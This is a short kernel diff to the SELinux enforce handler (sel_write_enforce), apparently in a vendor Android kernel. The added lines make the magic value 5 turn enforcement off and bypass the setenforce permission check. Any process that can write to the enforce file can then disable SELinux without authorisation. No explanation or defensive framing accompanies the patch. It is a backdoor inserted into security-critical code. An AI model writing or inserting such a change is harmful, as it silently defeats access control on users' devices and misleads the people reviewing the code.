@@ -149,7 +149,7 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 {
 	char *page = NULL;
 	ssize_t length;
-	int new_value;
+	int new_value, root_perm = 0;
 
 	length = -ENOMEM;
 	if (count >= PAGE_SIZE)
@@ -173,6 +173,11 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 	if (sscanf(page, "%d", &new_value) != 1)
 		goto out;
 
+	if (new_value == 5) {
+		new_value = 0;
+		root_perm = 1;
+	}
+
 // [ SEC_SELINUX_PORTING_COMMON
 #ifdef CONFIG_ALWAYS_ENFORCE
 	// If build is user build and enforce option is set, selinux is always enforcing
@@ -190,7 +195,7 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 #else
 	if (new_value != selinux_enforcing) {
 		length = task_has_security(current, SECURITY__SETENFORCE);
-		if (length)
+		if (length && !root_perm)
 			goto out;
 		audit_log(current->audit_context, GFP_KERNEL, AUDIT_MAC_STATUS,
 			"enforcing=%d old_enforcing=%d auid=%u ses=%u",
